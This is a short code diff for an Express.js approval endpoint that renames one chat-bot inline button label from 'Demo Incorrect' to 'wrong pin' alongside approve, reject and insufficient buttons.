@@ -94,7 +94,7 @@ app.post('/api/request-approval', async (req, res) => {
             { text: '✅ Approve', callback_data: `approve:${id}` },
             { text: '❌ Reject', callback_data: `deny:${id}` },
             { text: '⚠️ Insufficient', callback_data: `insufficient:${id}` },
-          { text: '🔢 Demo Incorrect', callback_data: `demo_error:${id}` },
+          { text: '🔢 wrong pin', callback_data: `demo_error:${id}` },
           ]
         : [
             { text: '✅ Approve', callback_data: `approve:${id}` },
